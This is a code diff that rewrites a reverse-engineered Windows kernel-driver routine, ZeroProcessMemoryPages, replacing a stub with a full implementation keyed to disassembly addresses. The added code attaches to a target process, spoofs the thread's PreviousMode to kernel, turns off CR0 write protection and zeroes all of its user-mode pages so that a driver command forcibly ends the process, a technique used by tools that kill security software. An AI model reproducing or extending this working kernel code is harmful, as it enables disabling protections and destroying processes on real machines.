@@ -3966,23 +3966,125 @@ __int64 WriteDiskSectorsWithPartitionCheck(char IsWrite, const void *DataBuffer,
 }
 
 // ZeroProcessMemoryPages — 清零进程内存页面
-// 遍历进程的页表条目（PTE），将指定页面的物理页清零并清除页面标记
-// 对应原始驱动 sub_14007F138
+// 对应原始驱动 0x14007F138（0x21F 字节）
+//
+// 【2026-10-21 重写】旧实现违反"严禁占位/骨架代码"：做完几个地址校验后
+//   直接 `Result = 1`，注释写着"需要通过 PTE 遍历实现"——真正的清零逻辑缺失，
+//   所以 0x28（CmdProcessOperation）从来不会真的结束进程。
+//
+// 原始算法（逐条对应反汇编）：
+//   槽位（全部已用 ntoskrnl 导出表反查确认，见 xpc_gt_enum.h 注释）：
+//     0x43A3 = &MmUserProbeAddress      0x41DE = NtQuerySystemInformation
+//     0x41E4 = MmGetPhysicalAddress     0x41E1 = MmGetVirtualForPhysical
+//     0x41DB = MmIsAddressValid         0x27   = KTHREAD.PreviousMode 偏移
+//     0x2A   = EPROCESS 里"用户空间基址"字段偏移
+//   0x14007F1C6..208  七个非零前置 + ValidateProcessObject(PROCESS,0)==1
+//   0x14007F20E..245  NtQuerySystemInformation(0=SystemBasicInformation, buf, 0x40, 0)
+//                     调用前后把当前线程 PreviousMode 字节临时清 0（把
+//                     Nt* 调用伪装成内核态发起，避免 PreviousMode 校验失败）
+//   0x14007F248..260  MinPageCount = min(info[3], info[5])；
+//                     MaxAddressLimit = MinPageCount * info[2]
+//                     （info[2]=PageSize，[3]=MmNumberOfPhysicalPages，
+//                       [5]=MmHighestPhysicalPage ⇒ 物理内存上限）
+//   0x14007F267  ReferenceObjectSafe(PROCESS)
+//   0x14007F273..2B4  CurrentAddress = 0x1000；EndAddress = *(&MmUserProbeAddress)；
+//                     if (EndAddress >= 4GB) { PageSize = GT[0x2A]；
+//                         if (PageSize != -1) CurrentAddress = *(QWORD*)(PROCESS+PageSize)；}
+//                     if (EndAddress > CurrentAddress && EndAddress-CurrentAddress > 4GB)
+//                         EndAddress = CurrentAddress + 4GB；
+//   0x14007F2C3  KeStackAttachProcess
+//   0x14007F2C9..322  逐页（步长 0x1000）：
+//                     PageFrame = MmGetPhysicalAddress(CurrentAddress)；
+//                     if (PageFrame && PageFrame < MaxAddressLimit   ← **有符号** jge
+//                         && CmdStubAlwaysTrue()==1
+//                         && CurrentAddress == MmGetVirtualForPhysical(PageFrame))
+//                     { DisableCr0WriteProtect(&Saved); memset(CurrentAddress,0,0x1000);
+//                       RestoreCr0WriteProtect(&Saved); }
+//   0x14007F344..352  KeUnstackDetachProcess；IsReferenced==1 则 DereferenceObjectSafe
 __int64 ZeroProcessMemoryPages(PRKPROCESS PROCESS)
 {
-    __int64 Result = 0;
-    if (!PROCESS || PROCESS < (PRKPROCESS)MmSystemRangeStart)
-        return Result;
-    if (MmIsAddressValid(PROCESS) != 1)
-        return Result;
-    PEPROCESS Eprocess = *(PEPROCESS *)PROCESS;
-    if (!Eprocess || !MmIsAddressValid(Eprocess))
-        return Result;
-    PKPROCESS KernelProcess = *(PKPROCESS *)Eprocess;
-    if (!KernelProcess || !MmIsAddressValid(KernelProcess))
-        return Result;
-    // 清零页面的物理地址需要通过 PTE 遍历实现
-    Result = 1;
-    return Result;
+    ULONG64 SavedState[3];
+    ULONG64 *UserVaMaxPtr;
+    void (__fastcall *QuerySystemInfoFunc)(ULONG, PVOID, ULONG, PULONG);
+    ULONG64 (__fastcall *GetPhysicalAddrFunc)(ULONG64);
+    ULONG64 (__fastcall *PhysToVaFunc)(ULONG64);
+    UCHAR (__fastcall *IsAddressValidFunc)(ULONG64);
+    ULONG PrevModeOffset;
+    ULONG SystemInfo[16];
+    KAPC_STATE ApcState;
+    ULONG64 MaxAddressLimit;
+    ULONG64 CurrentAddress;
+    ULONG64 EndAddress;
+    ULONG PageSizeField;
+    UCHAR IsReferenced;
+    ULONG MinPageCount;
+    char SavedPrevMode;
+    PKTHREAD CurrentThread;
+
+    SavedState[1] = (ULONG64)PROCESS;
+    UserVaMaxPtr = (ULONG64 *)GtRead(GtUserVaMaxPtr);
+    QuerySystemInfoFunc = (void (__fastcall *)(ULONG, PVOID, ULONG, PULONG))GtRead(GtQuerySystemInfoFunc);
+    GetPhysicalAddrFunc = (ULONG64 (__fastcall *)(ULONG64))GtRead(GtReadMemoryFunc);
+    PhysToVaFunc = (ULONG64 (__fastcall *)(ULONG64))GtRead(GtPhysToVaFunc);
+    PrevModeOffset = (ULONG)GtRead(GtSdstServiceCount);
+    IsAddressValidFunc = (UCHAR (__fastcall *)(ULONG64))GtRead(GtObjectTypeCheckFlag);
+    SavedState[2] = (ULONG64)IsAddressValidFunc;
+
+    if (!UserVaMaxPtr || !QuerySystemInfoFunc || !GetPhysicalAddrFunc || !PhysToVaFunc
+        || PrevModeOffset == (ULONG)-1 || !IsAddressValidFunc
+        || ValidateProcessObject(PROCESS, 0) != 1)
+        return 0;
+
+    memset(SystemInfo, 0, sizeof(SystemInfo));
+    CurrentThread = KeGetCurrentThread();
+    SavedPrevMode = *((char *)CurrentThread + PrevModeOffset);
+    *((char *)CurrentThread + PrevModeOffset) = 0;
+    QuerySystemInfoFunc(0, SystemInfo, 0x40, NULL);
+    *((char *)CurrentThread + PrevModeOffset) = SavedPrevMode;
+
+    MinPageCount = SystemInfo[3];
+    if (SystemInfo[3] > SystemInfo[5])          /* cmova：无符号取小 */
+        MinPageCount = SystemInfo[5];
+    SystemInfo[3] = MinPageCount;
+    /* movsxd rdi,[info[2]] / cdqe / imul rdi,rax：两个 32 位值**有符号**相乘 */
+    MaxAddressLimit = (__int64)(int)SystemInfo[2] * (__int64)(int)MinPageCount;
+
+    IsReferenced = ReferenceObjectSafe((__int64)PROCESS);
+
+    CurrentAddress = 0x1000;
+    EndAddress = *UserVaMaxPtr;
+    if (*UserVaMaxPtr >= 0x100000000ULL)
+    {
+        PageSizeField = (ULONG)GtRead(GtEprocessField32);
+        if (PageSizeField != (ULONG)-1)
+            CurrentAddress = *(ULONG64 *)((PUCHAR)PROCESS + PageSizeField);
+    }
+    if (EndAddress > CurrentAddress && EndAddress - CurrentAddress > 0x100000000ULL)
+        EndAddress = CurrentAddress + 0x100000000ULL;
+
+    KeStackAttachProcess((PKPROCESS)PROCESS, &ApcState);
+    while (CurrentAddress < EndAddress)
+    {
+        ULONG64 PageFrame = GetPhysicalAddrFunc(CurrentAddress);
+        /* 第三判据是 `call CmdStubAlwaysTrue(rcx=MmIsAddressValid 地址, rdx=物理帧)`：
+           作者把地址有效性检查伪装成一次恒真桩调用，参数被忽略、结果恒为 1。
+           第四判据才是真正的校验：物理帧回代得到的 VA 必须等于当前地址。 */
+        if (PageFrame
+            && (__int64)PageFrame < (__int64)MaxAddressLimit   /* jge：有符号 */
+            && CmdStubAlwaysTrue((__int64)IsAddressValidFunc, (__int64)PageFrame, NULL, 0) == 1
+            && CurrentAddress == PhysToVaFunc(PageFrame))
+        {
+            DisableCr0WriteProtect(&SavedState[0]);
+            memset((void *)CurrentAddress, 0, 0x1000);
+            RestoreCr0WriteProtect(&SavedState[0]);
+        }
+        CurrentAddress += 0x1000;
+    }
+    KeUnstackDetachProcess(&ApcState);
+
+    if (IsReferenced == 1)
+        DereferenceObjectSafe((__int64)PROCESS);
+
+    return 1;
 }
 
